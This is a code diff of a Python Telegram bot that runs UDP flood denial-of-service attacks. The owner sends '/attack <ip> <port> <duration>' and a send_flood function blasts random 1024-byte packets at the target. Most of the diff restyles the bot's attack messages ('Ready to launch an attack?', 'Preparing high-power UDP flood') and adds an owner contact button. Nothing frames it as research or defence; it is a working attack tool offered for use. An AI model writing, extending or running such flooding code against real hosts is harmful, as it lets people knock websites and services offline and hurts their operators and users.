@@ -13,11 +13,23 @@ OWNER_ID = 5470646229  # Sirf aap hi use kar paoge
 # /start command with button
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
-        [InlineKeyboardButton("👤 CONNECT OWNER", url="https://t.me/VIP_OWNER9")]
+        [InlineKeyboardButton("👑 CONNECT OWNER", url="https://t.me/VIP_OWNER9")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
+
     await update.message.reply_text(
-        "👋 Welcome Pawan Bhai! Use: /attack <ip> <port> <seconds>",
+        f"*💣 Ready to launch an attack?*
+
+"
+        f"📌 *Use the following format:*
+"
+        f"`/attack <ip> <port> <duration>`
+
+"
+        f"🔰 *Example:*
+"
+        f"`/attack 1.1.1.1 80 100`",
+        parse_mode='Markdown',
         reply_markup=reply_markup
     )
 
@@ -28,7 +40,7 @@ def send_flood(ip, port, duration):
     data = random._urandom(1024)
     while time.time() < timeout:
         try:
-            for _ in range(1000):  # 1000 packets per loop
+            for _ in range(1000):
                 sock.sendto(data, (ip, port))
         except:
             continue
@@ -54,7 +66,26 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if len(context.args) != 3:
-        await update.message.reply_text("❌ Usage: /attack <ip> <port> <duration>")
+        keyboard = [
+            [InlineKeyboardButton("👑 CONNECT OWNER", url="https://t.me/VIP_OWNER9")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+
+        await update.message.reply_text(
+            f"*💣 Ready to launch an attack?*
+
+"
+            f"📌 *Use the following format:*
+"
+            f"`/attack <ip> <port> <duration>`
+
+"
+            f"🔰 *Example:*
+"
+            f"`/attack 1.1.1.1 80 100`",
+            parse_mode='Markdown',
+            reply_markup=reply_markup
+        )
         return
 
     ip = context.args[0]
@@ -65,7 +96,28 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Port and duration must be numbers.")
         return
 
-    await update.message.reply_text(f"🚀 Attack started on {ip}:{port} for {duration} seconds with 🔥 HIGH POWER")
+    keyboard = [
+        [InlineKeyboardButton("👑 CONNECT OWNER", url="https://t.me/VIP_OWNER9")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+
+    await update.message.reply_text(
+        f"*🚀 Attack Initiated!*
+
+"
+        f"🌐 *Target IP:* `{ip}` 🌱🌱🌱
+"
+        f"🚪 *Port:* `{port}` 🔐
+"
+        f"⏳ *Duration:* `{duration}` seconds
+
+"
+        f"🔥 *Preparing high-power UDP flood...*
+"
+        f"🔄 *Status: Attack in progress...*",
+        parse_mode='Markdown',
+        reply_markup=reply_markup
+    )
 
     loop = asyncio.get_event_loop()
     await loop.run_in_executor(None, start_attack, ip, port, duration)
@@ -78,4 +130,4 @@ if __name__ == "__main__":
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("attack", attack))
     app.run_polling()
-        
+    
